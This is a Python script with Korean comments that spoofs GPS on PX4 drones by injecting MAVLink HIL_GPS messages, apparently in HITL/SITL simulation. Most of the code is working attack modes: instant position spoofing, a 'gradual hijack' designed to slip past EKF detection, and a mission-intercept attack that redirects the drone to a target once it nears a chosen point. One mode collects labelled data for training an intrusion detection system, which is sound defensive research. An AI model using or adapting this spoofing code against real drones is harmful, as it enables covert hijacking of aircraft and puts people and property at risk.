#!/usr/bin/env python3
"""
HITL UDP GPS 스푸핑 - Windows 호환 권장 버전
PX4 v1.14 + pymavlink 2.4.49 + X-Plane 12

정상 미션 비행 중 GPS 스푸핑 주입 → 경로 이탈 시나리오
IDS 학습용 데이터 수집 기능 포함
"""
import os
os.environ['MAVLINK20'] = '1'

import time
import math
import sys
import csv
import threading
from datetime import datetime
from pymavlink import mavutil

class HITLUDPSpoofer:
    def __init__(self, connection_string='udp:127.0.0.1:14557'):
        """
        HITL/SITL 양쪽 호환 UDP 스푸퍼
        
        Args:
            connection_string: MAVLink 연결 문자열
            - SITL: 'udp:127.0.0.1:14557' (기본 API 포트)
            - HITL: 'udp:127.0.0.1:14550' 또는 시리얼 포트
        """
        print(f"연결: {connection_string}")
        
        self.master = mavutil.mavlink_connection(
            connection_string,
            source_system=255,
            source_component=190
        )
        
        self.boot_time = time.time()
        self.running = False
        self.spoof_thread = None
        self.current_spoof = None
        self.data_log = []
        
    def wait_heartbeat(self, timeout=30):
        """하트비트 대기 및 연결 확인"""
        print(f"하트비트 대기 중... (최대 {timeout}초)")
        
        start = time.time()
        while (time.time() - start) < timeout:
            try:
                msg = self.master.recv_match(type='HEARTBEAT', blocking=True, timeout=1)
                if msg:
                    print(f"연결됨! System: {msg.get_srcSystem()}, Type: {msg.type}")
                    return True
            except Exception as e:
                print(f"수신 오류: {e}")
                time.sleep(0.5)
                
        print("타임아웃: 하트비트 없음")
        return False
        
    def get_safe_timestamp_us(self):
        """uint64 범위 내 안전한 타임스탬프"""
        elapsed = time.time() - self.boot_time
        return int(elapsed * 1e6) & 0xFFFFFFFFFFFFFFFF
        
    def send_hil_gps(self, lat_deg, lon_deg, alt_m,
                     vn_ms=0.0, ve_ms=0.0, vd_ms=0.0,
                     fix_type=3, satellites=12,
                     hdop=1.0, vdop=1.0):
        """
        완전한 HIL_GPS 메시지 전송
        모든 파라미터 범위 검증 포함
        """
        # 단위 변환 및 범위 제한
        lat_e7 = max(-900000000, min(900000000, int(lat_deg * 1e7)))
        lon_e7 = max(-1800000000, min(1800000000, int(lon_deg * 1e7)))
        alt_mm = max(-1000000000, min(1000000000, int(alt_m * 1000)))
        
        # 속도 (m/s → cm/s, int16 범위)
        vn_cms = max(-32768, min(32767, int(vn_ms * 100)))
        ve_cms = max(-32768, min(32767, int(ve_ms * 100)))
        vd_cms = max(-32768, min(32767, int(vd_ms * 100)))
        
        # 지상속도 (uint16)
        ground_speed = math.sqrt(vn_ms**2 + ve_ms**2)
        vel_cms = max(0, min(65535, int(ground_speed * 100)))
        
        # DOP (uint16)
        eph = max(0, min(65535, int(hdop * 100)))
        epv = max(0, min(65535, int(vdop * 100)))
        
        # 진행방향 (cdeg, 0-35999)
        if ground_speed > 0.1:
            cog = int(math.degrees(math.atan2(ve_ms, vn_ms)) * 100)
            if cog < 0:
                cog += 36000
            cog = cog % 36000
        else:
            cog = 0
            
        try:
            self.master.mav.hil_gps_send(
                self.get_safe_timestamp_us(),
                fix_type,
                lat_e7, lon_e7, alt_mm,
                eph, epv,
                vel_cms,
                vn_cms, ve_cms, vd_cms,
                cog,
                satellites
            )
            return True
        except Exception as e:
            print(f"HIL_GPS 오류: {e}")
            return False
            
    def get_current_position(self, timeout=5):
        """현재 드론 위치 획득"""
        start = time.time()
        while (time.time() - start) < timeout:
            msg = self.master.recv_match(type='GLOBAL_POSITION_INT', blocking=True, timeout=1)
            if msg:
                return {
                    'lat': msg.lat / 1e7,
                    'lon': msg.lon / 1e7,
                    'alt': msg.alt / 1000,
                    'relative_alt': msg.relative_alt / 1000,
                    'vx': msg.vx / 100,
                    'vy': msg.vy / 100,
                    'vz': msg.vz / 100
                }
        return None
        
    def set_mode_offboard(self):
        """Offboard 모드로 전환 (PX4)"""
        print("Offboard 모드 전환 시도...")
        
        # MAV_CMD_DO_SET_MODE
        self.master.mav.command_long_send(
            self.master.target_system,
            self.master.target_component,
            mavutil.mavlink.MAV_CMD_DO_SET_MODE,
            0,  # confirmation
            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            6,  # PX4_CUSTOM_MAIN_MODE_OFFBOARD
            0, 0, 0, 0, 0
        )
        
        # 결과 대기
        msg = self.master.recv_match(type='COMMAND_ACK', blocking=True, timeout=3)
        if msg and msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
            print("Offboard 모드 전환 성공")
            return True
        else:
            print("Offboard 모드 전환 실패 (정상 - SITL에서는 무시 가능)")
            return False
            
    def _spoof_thread_func(self, rate_hz):
        """백그라운드 GPS 스푸핑 스레드"""
        interval = 1.0 / rate_hz
        
        while self.running and self.current_spoof:
            lat, lon, alt = self.current_spoof
            self.send_hil_gps(lat, lon, alt)
            time.sleep(interval)
            
    def start_continuous_spoof(self, lat, lon, alt, rate_hz=50):
        """연속 GPS 스푸핑 시작"""
        self.current_spoof = (lat, lon, alt)
        self.running = True
        
        self.spoof_thread = threading.Thread(
            target=self._spoof_thread_func,
            args=(rate_hz,),
            daemon=True
        )
        self.spoof_thread.start()
        print(f"연속 스푸핑 시작: {lat:.6f}, {lon:.6f}, {alt:.1f}m @ {rate_hz}Hz")
        
    def update_spoof_position(self, lat, lon, alt):
        """스푸핑 위치 실시간 업데이트"""
        self.current_spoof = (lat, lon, alt)
        
    def stop_continuous_spoof(self):
        """연속 스푸핑 중지"""
        self.running = False
        if self.spoof_thread:
            self.spoof_thread.join(timeout=2)
        self.current_spoof = None
        print("스푸핑 중지됨")
        
    def gradual_hijack(self, target_lat, target_lon, target_alt,
                       duration_s=30, rate_hz=50):
        """
        점진적 경로 납치 (현재 위치에서 시작)
        
        EKF 탐지를 피하기 위해 천천히 위치를 이동
        """
        print("\n=== 점진적 GPS 납치 시작 ===")
        
        # 현재 위치 획득
        current = self.get_current_position()
        if not current:
            print("현재 위치 획득 실패")
            return False
            
        start_lat = current['lat']
        start_lon = current['lon']
        start_alt = current['alt']
        
        print(f"현재: {start_lat:.6f}, {start_lon:.6f}, {start_alt:.1f}m")
        print(f"목표: {target_lat:.6f}, {target_lon:.6f}, {target_alt:.1f}m")
        print(f"소요시간: {duration_s}초")
        
        steps = int(duration_s * rate_hz)
        interval = 1.0 / rate_hz
        
        for i in range(steps + 1):
            if not self.running:
                break
                
            progress = i / steps
            
            # S-curve 보간 (더 자연스러운 이동)
            smooth_progress = (1 - math.cos(progress * math.pi)) / 2
            
            lat = start_lat + (target_lat - start_lat) * smooth_progress
            lon = start_lon + (target_lon - start_lon) * smooth_progress
            alt = start_alt + (target_alt - start_alt) * smooth_progress
            
            # 속도 계산 (이전 위치와의 차이)
            if i > 0:
                dlat = (target_lat - start_lat) * smooth_progress / duration_s
                dlon = (target_lon - start_lon) * smooth_progress / duration_s
                vn = dlat * 111320
                ve = dlon * 111320 * math.cos(math.radians(lat))
            else:
                vn, ve = 0, 0
                
            self.send_hil_gps(lat, lon, alt, vn_ms=vn, ve_ms=ve)
            
            # 데이터 로깅
            self.data_log.append({
                'timestamp': time.time(),
                'progress': progress,
                'spoof_lat': lat,
                'spoof_lon': lon,
                'spoof_alt': alt
            })
            
            # 진행 상황 (10% 단위)
            if i % max(1, steps // 10) == 0:
                print(f"[{progress*100:5.1f}%] {lat:.6f}, {lon:.6f}, {alt:.1f}m")
                
            time.sleep(interval)
            
        print("납치 완료!")
        return True
        
    def mission_intercept_attack(self, intercept_lat, intercept_lon,
                                  redirect_lat, redirect_lon, redirect_alt,
                                  detection_radius_m=100):
        """
        미션 비행 중 가로채기 공격
        
        드론이 특정 위치에 도달하면 GPS 스푸핑으로 경로 변경
        """
        print("\n=== 미션 가로채기 공격 ===")
        print(f"가로채기 지점: {intercept_lat:.6f}, {intercept_lon:.6f}")
        print(f"리디렉션 목표: {redirect_lat:.6f}, {redirect_lon:.6f}")
        print(f"탐지 반경: {detection_radius_m}m")
        print("\n드론 위치 모니터링 중... (Ctrl+C로 중단)")
        
        self.running = True
        
        try:
            while self.running:
                pos = self.get_current_position(timeout=2)
                if not pos:
                    continue
                    
                # 거리 계산
                dlat = (pos['lat'] - intercept_lat) * 111320
                dlon = (pos['lon'] - intercept_lon) * 111320 * math.cos(math.radians(pos['lat']))
                distance = math.sqrt(dlat**2 + dlon**2)
                
                print(f"\r거리: {distance:.1f}m | 위치: {pos['lat']:.6f}, {pos['lon']:.6f}", end='')
                
                if distance < detection_radius_m:
                    print(f"\n\n가로채기 지점 도달! 공격 시작...")
                    
                    # 점진적 납치
                    self.gradual_hijack(
                        redirect_lat, redirect_lon, redirect_alt,
                        duration_s=30,
                        rate_hz=50
                    )
                    break
                    
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print("\n\n사용자 중단")
            
        self.running = False
        
    def collect_ids_data(self, output_file, duration_s=300, spoof_start_pct=50):
        """
        IDS 학습용 데이터 수집
        
        Args:
            output_file: CSV 출력 파일
            duration_s: 총 수집 시간 (초)
            spoof_start_pct: 스푸핑 시작 시점 (%)
        """
        print(f"\n=== IDS 데이터 수집 ===")
        print(f"출력: {output_file}")
        print(f"시간: {duration_s}초")
        print(f"스푸핑 시작: {spoof_start_pct}% 지점")
        
        with open(output_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                'timestamp', 'label',
                'real_lat', 'real_lon', 'real_alt',
                'real_vx', 'real_vy', 'real_vz',
                'spoof_lat', 'spoof_lon', 'spoof_alt',
                'offset_m'
            ])
            
            start_time = time.time()
            spoof_active = False
            spoof_pos = None
            sample_count = 0
            
            while (time.time() - start_time) < duration_s:
                elapsed = time.time() - start_time
                progress = (elapsed / duration_s) * 100
                
                # 스푸핑 시작 조건
                if progress >= spoof_start_pct and not spoof_active:
                    spoof_active = True
                    pos = self.get_current_position(timeout=1)
                    if pos:
                        # 500m 오프셋
                        spoof_pos = (pos['lat'] + 0.0045, pos['lon'] + 0.0045, pos['alt'])
                        self.start_continuous_spoof(*spoof_pos, rate_hz=50)
                        print(f"\n[{elapsed:.1f}s] 스푸핑 활성화!")
                        
                # 데이터 샘플링
                pos = self.get_current_position(timeout=0.5)
                if pos:
                    if spoof_active and spoof_pos:
                        offset = math.sqrt(
                            ((pos['lat'] - spoof_pos[0]) * 111320)**2 +
                            ((pos['lon'] - spoof_pos[1]) * 111320 * math.cos(math.radians(pos['lat'])))**2
                        )
                    else:
                        offset = 0
                        spoof_pos = (0, 0, 0)
                        
                    writer.writerow([
                        time.time(),
                        'spoofed' if spoof_active else 'normal',
                        pos['lat'], pos['lon'], pos['alt'],
                        pos['vx'], pos['vy'], pos['vz'],
                        spoof_pos[0], spoof_pos[1], spoof_pos[2],
                        offset
                    ])
                    sample_count += 1
                    
                    if sample_count % 50 == 0:
                        label = 'SPOOF' if spoof_active else 'NORMAL'
                        print(f"\r[{elapsed:.1f}s] {label} | 샘플: {sample_count}", end='')
                        
        self.stop_continuous_spoof()
        print(f"\n\n데이터 수집 완료: {sample_count}개 샘플 → {output_file}")


def main():
    print("=" * 60)
    print("HITL/SITL UDP GPS 스푸핑 - Windows 호환")
    print("PX4 v1.14 + X-Plane 12 + pymavlink 2.4.49")
    print("=" * 60)
    print()
    
    print("연결 설정:")
    print("  1. SITL (udp:127.0.0.1:14557)")
    print("  2. HITL/QGC (udp:127.0.0.1:14550)")
    print("  3. 사용자 정의")
    
    conn_choice = input("\n선택 (1-3, 기본=1): ").strip() or '1'
    
    if conn_choice == '1':
        conn_str = 'udp:127.0.0.1:14557'
    elif conn_choice == '2':
        conn_str = 'udp:127.0.0.1:14550'
    else:
        conn_str = input("연결 문자열: ").strip()
        
    print()
    
    try:
        spoofer = HITLUDPSpoofer(connection_string=conn_str)
    except Exception as e:
        print(f"연결 생성 실패: {e}")
        sys.exit(1)
        
    if not spoofer.wait_heartbeat(timeout=30):
        print("\n연결 실패. 확인 사항:")
        print("  1. PX4 SITL/HITL 실행 중?")
        print("  2. MAVLink 포트 올바른가?")
        print("  3. 방화벽 설정?")
        sys.exit(1)
        
    print("\n=== 공격 모드 선택 ===")
    print("1. 즉시 고정 위치 스푸핑")
    print("2. 점진적 경로 납치")
    print("3. 미션 가로채기 공격")
    print("4. IDS 데이터 수집")
    
    mode = input("\n선택 (1-4): ").strip()
    
    # 목표 위치 (부산)
    BUSAN = (35.1796, 129.0756, 100.0)
    
    if mode == '1':
        # 즉시 스푸핑
        lat = float(input(f"목표 위도 (기본={BUSAN[0]}): ").strip() or BUSAN[0])
        lon = float(input(f"목표 경도 (기본={BUSAN[1]}): ").strip() or BUSAN[1])
        alt = float(input(f"목표 고도 (기본={BUSAN[2]}): ").strip() or BUSAN[2])
        duration = int(input("지속시간 초 (기본=120): ").strip() or '120')
        
        spoofer.running = True
        spoofer.start_continuous_spoof(lat, lon, alt, rate_hz=50)
        
        print(f"\n{duration}초 동안 스푸핑 진행 중... (Ctrl+C로 중단)")
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            pass
            
        spoofer.stop_continuous_spoof()
        
    elif mode == '2':
        # 점진적 납치
        lat = float(input(f"목표 위도 (기본={BUSAN[0]}): ").strip() or BUSAN[0])
        lon = float(input(f"목표 경도 (기본={BUSAN[1]}): ").strip() or BUSAN[1])
        alt = float(input(f"목표 고도 (기본={BUSAN[2]}): ").strip() or BUSAN[2])
        duration = int(input("납치 소요시간 초 (기본=60): ").strip() or '60')
        
        spoofer.running = True
        spoofer.gradual_hijack(lat, lon, alt, duration_s=duration, rate_hz=50)
        
    elif mode == '3':
        # 미션 가로채기
        print("\n가로채기 지점 (드론이 이 위치에 도달하면 공격 시작)")
        int_lat = float(input("위도: "))
        int_lon = float(input("경도: "))
        
        print("\n리디렉션 목표")
        red_lat = float(input(f"위도 (기본={BUSAN[0]}): ").strip() or BUSAN[0])
        red_lon = float(input(f"경도 (기본={BUSAN[1]}): ").strip() or BUSAN[1])
        red_alt = float(input(f"고도 (기본={BUSAN[2]}): ").strip() or BUSAN[2])
        
        spoofer.mission_intercept_attack(
            int_lat, int_lon,
            red_lat, red_lon, red_alt,
            detection_radius_m=100
        )
        
    elif mode == '4':
        # IDS 데이터 수집
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output = f"gps_ids_data_{timestamp}.csv"
        duration = int(input("수집 시간 초 (기본=300): ").strip() or '300')
        
        spoofer.running = True
        spoofer.collect_ids_data(output, duration_s=duration)
        
    else:
        print("잘못된 선택")
        
    print("\n프로그램 종료")


if __name__ == "__main__":
    main()